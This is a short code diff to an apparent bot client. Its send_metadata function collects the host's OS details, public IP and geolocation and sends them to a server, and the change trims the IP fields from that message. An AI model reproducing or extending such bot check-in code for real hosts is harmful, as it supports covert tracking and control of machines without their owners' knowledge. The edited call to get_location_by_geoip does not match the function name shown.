@@ -63,20 +63,19 @@ def get_location_by_geopy(ip):
 
 def send_metadata(client_socket):
     """
-    Sends bot metadata (OS info, IPs, and location) to the server.
+    Sends bot metadata (OS info, public IP, and location) to the server.
     """
     try:
         os_info = platform.system() + " " + platform.release()
-        local_ip = get_local_ip()
         public_ip = get_public_ip()
-        latitude, longitude = get_location_by_geopy(public_ip)
+        latitude, longitude = get_location_by_geoip(public_ip)
 
         if public_ip and latitude is not None and longitude is not None:
-            metadata = f"{os_info}|{local_ip}|{public_ip}|{latitude}|{longitude}"
+            metadata = f"{os_info}|{latitude}|{longitude}"
             client_socket.send(metadata.encode('utf-8'))
             print(f"[Bot] Sent metadata: {metadata}")
         else:
-            print("[Bot] Could not send metadata due to missing public IP or location.")
+            print("[Bot] Could not send metadata due to missing location.")
     except Exception as e:
         print(f"[Bot] Error sending metadata: {e}")
 
